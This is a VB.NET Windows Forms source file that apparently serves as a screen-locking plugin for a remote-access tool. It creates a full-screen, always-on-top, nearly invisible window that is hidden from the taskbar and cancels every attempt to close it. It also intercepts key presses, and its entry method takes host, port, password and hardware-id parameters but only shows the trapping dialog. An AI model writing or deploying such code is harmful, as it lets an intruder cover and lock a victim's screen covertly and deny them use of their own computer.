Imports System.Windows.Forms

<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form
    Public Shared F As New Form1


    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.SuspendLayout()
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(800, 450)
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form1"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Text = "Form1"
        Me.WindowState = System.Windows.Forms.FormWindowState.Maximized
        Dim BorderWidth As Integer = CInt((Me.Width - Me.ClientSize.Width) / 2)
        Dim TitlebarHeight As Integer = Me.Height - Me.ClientSize.Height - 2 * BorderWidth
        Me.BackColor = Drawing.Color.Lime
        Me.Opacity = 0.1R
        Me.Width = Windows.Forms.Screen.PrimaryScreen.Bounds.Width
        Me.Height = Windows.Forms.Screen.PrimaryScreen.Bounds.Height + TitlebarHeight
        Me.Left = 0
        Me.Top = -TitlebarHeight
        Me.ResumeLayout(False)

    End Sub

    Protected Overrides ReadOnly Property CreateParams() As CreateParams ' This code keeps Form2 at the top of the z order always so it's always on top of any other app running
        Get
            Const WS_EX_TOPMOST As Integer = &H8
            Dim cp As CreateParams = MyBase.CreateParams
            cp.ExStyle = cp.ExStyle Or WS_EX_TOPMOST
            Return cp
        End Get
    End Property

    Private Const KEYEVENTF_EXTENDEDKEY As Long = &H1
    Private Const KEYEVENTF_KEYUP As Long = &H2
    Private Const VK_LWIN As Byte = &H5B
    Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte,
    ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
    Private Sub Form1_MouseDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyDown
        On Error Resume Next
        keybd_event(CByte(Keys.Zoom), 0, KEYEVENTF_EXTENDEDKEY, 0)
    End Sub

    Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
        F.ShowDialog()
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        e.Cancel = True
    End Sub

End Class
